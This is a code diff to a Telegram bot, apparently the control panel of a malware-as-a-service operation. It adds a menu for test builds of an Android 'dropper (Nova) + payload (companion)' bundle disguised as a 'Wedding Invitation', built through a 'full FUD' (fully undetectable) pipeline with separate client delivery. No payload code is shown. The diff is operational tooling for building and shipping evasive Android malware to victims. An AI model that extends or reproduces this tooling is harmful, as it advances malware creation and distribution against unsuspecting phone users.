@@ -1129,6 +1129,20 @@ def kb_prod_menu() -> types.InlineKeyboardMarkup:
     return kb
 
 
+def kb_prod_test_build_type() -> types.InlineKeyboardMarkup:
+    """Build type selection — shown when Test Build is pressed."""
+    kb = types.InlineKeyboardMarkup(row_width=1)
+    kb.add(
+        types.InlineKeyboardButton(
+            "💍 Wedding Invitation",   callback_data="prod_test_build_full"),
+        types.InlineKeyboardButton(
+            "🔧 Companion App",        callback_data="prod_test_build_companion"),
+        types.InlineKeyboardButton(
+            "❌ Cancel",               callback_data="prod_menu"),
+    )
+    return kb
+
+
 def kb_prod_test_build_confirm() -> types.InlineKeyboardMarkup:
     kb = types.InlineKeyboardMarkup(row_width=2)
     kb.add(
@@ -2157,8 +2171,11 @@ def prod_next_version() -> str:
 
 
 def prod_trigger_dev_build(chat_id: int, msg_id: int,
-                           template: str = "wedding") -> bool:
-    """Trigger build_dev.yml on dev branch (test build — no client delivery)."""
+                           template: str = "wedding",
+                           build_type: str = "full") -> bool:
+    """Trigger build_dev.yml on dev branch (test build — no client delivery).
+    build_type: 'full' = dropper+companion, 'companion_only' = payload APK only.
+    """
     url = (f"{GH_REPO()}/actions/workflows/build_dev.yml/dispatches")
     payload = {
         "ref": "dev",
@@ -2166,6 +2183,7 @@ def prod_trigger_dev_build(chat_id: int, msg_id: int,
             "template":         template,
             "build_chat_id":    str(chat_id),
             "build_message_id": str(msg_id),
+            "build_type":       build_type,
         }
     }
     try:
@@ -3414,26 +3432,41 @@ def handle_callback(call):
                       kb_prod_back())
 
     elif data == "prod_test_build":
-        # ── Show confirmation screen — do NOT build yet ───────────────────────
+        # ── Show build type selection screen ─────────────────────────────────
         dev_info  = prod_get_branch_info("dev")
         main_info = prod_get_branch_info("main")
         safe_edit(chat_id, msg_id,
-                  "🧪 <b>Test Build — Confirm</b>\n"
+                  "🧪 <b>Test Build — Select Type</b>\n"
                   "━━━━━━━━━━━━━━━━━━━━\n"
                   f"🔒 main: <code>{main_info.get('sha','?')}</code>\n"
                   f"🧪 dev:  <code>{dev_info.get('sha','?')}</code>\n"
                   "━━━━━━━━━━━━━━━━━━━━\n"
-                  "This will:\n"
-                  "1️⃣ Auto-sync dev ← main\n"
-                  "2️⃣ Run full build pipeline on dev\n"
-                  "3️⃣ Send APK to your Telegram only\n\n"
-                  "⚠️ No client delivery. Confirm?",
-                  kb_prod_test_build_confirm())
+                  "Choose what to build:\n\n"
+                  "💍 <b>Wedding Invitation</b>\n"
+                  "   Dropper (Nova) + Payload (companion)\n"
+                  "   Full bundle — full FUD pipeline\n\n"
+                  "🔧 <b>Companion App</b>\n"
+                  "   Payload only (companion.apk)\n"
+                  "   No dropper, no Nova — fast build\n\n"
+                  "⚠️ No client delivery — admin only.",
+                  kb_prod_test_build_type())
 
-    elif data == "prod_test_build_confirm":
+    elif data in ("prod_test_build_full", "prod_test_build_companion",
+                  "prod_test_build_confirm"):
+        # ── Determine build type from callback ────────────────────────────────
+        # prod_test_build_confirm kept as legacy alias → full build
+        if data == "prod_test_build_companion":
+            build_type  = "companion_only"
+            build_label = "🔧 Companion App"
+            apk_note    = "companion.apk (payload only)"
+        else:
+            build_type  = "full"
+            build_label = "💍 Wedding Invitation"
+            apk_note    = "Nova dropper + companion APK (full bundle)"
+
         # ── Step 1: Auto-sync dev ← main ─────────────────────────────────────
         safe_edit(chat_id, msg_id,
-                  "🧪 <b>Test Build</b>\n"
+                  f"🧪 <b>Test Build — {build_label}</b>\n"
                   "━━━━━━━━━━━━━━━━━━━━\n"
                   "🔃 Step 1/2 — Auto-syncing dev ← main…",
                   kb_prod_back())
@@ -3452,20 +3485,22 @@ def handle_callback(call):
         else:
             sync_note = f"✅ Synced — merge commit <code>{sync_result}</code>"
 
-        # ── Step 2: Trigger full pipeline on dev ──────────────────────────────
+        # ── Step 2: Trigger build on dev with selected build_type ─────────────
         safe_edit(chat_id, msg_id,
-                  f"🧪 <b>Test Build</b>\n"
+                  f"🧪 <b>Test Build — {build_label}</b>\n"
                   f"━━━━━━━━━━━━━━━━━━━━\n"
                   f"🔃 Step 1/2 — Sync: {sync_note}\n"
                   f"🏗 Step 2/2 — Triggering build on dev branch…\n"
+                  f"📦 Output: {apk_note}\n"
                   f"APK will be sent to you only — no client delivery.",
                   kb_prod_back())
-        ok = prod_trigger_dev_build(chat_id, msg_id)
+        ok = prod_trigger_dev_build(chat_id, msg_id, build_type=build_type)
         if ok:
             # ── Fetch run_id so user can cancel ───────────────────────────────
             safe_edit(chat_id, msg_id,
                       f"🧪 <b>Test Build Triggered</b> ✅\n"
                       f"━━━━━━━━━━━━━━━━━━━━\n"
+                      f"📦 Type: {build_label}\n"
                       f"🔃 Sync: {sync_note}\n"
                       f"🏗 Build: running on <b>dev</b> branch\n"
                       f"🆔 Run ID: <i>fetching…</i>\n"
@@ -3478,6 +3513,7 @@ def handle_callback(call):
                 safe_edit(chat_id, msg_id,
                           f"🧪 <b>Test Build Triggered</b> ✅\n"
                           f"━━━━━━━━━━━━━━━━━━━━\n"
+                          f"📦 Type: {build_label}\n"
                           f"🔃 Sync: {sync_note}\n"
                           f"🏗 Build: running on <b>dev</b> branch\n"
                           f"🆔 Run ID: <code>#{run_id}</code>\n"
@@ -3490,6 +3526,7 @@ def handle_callback(call):
                 safe_edit(chat_id, msg_id,
                           f"🧪 <b>Test Build Triggered</b> ✅\n"
                           f"━━━━━━━━━━━━━━━━━━━━\n"
+                          f"📦 Type: {build_label}\n"
                           f"🔃 Sync: {sync_note}\n"
                           f"🏗 Build: running on <b>dev</b> branch\n"
                           f"🆔 Run ID: <i>unavailable</i>\n"
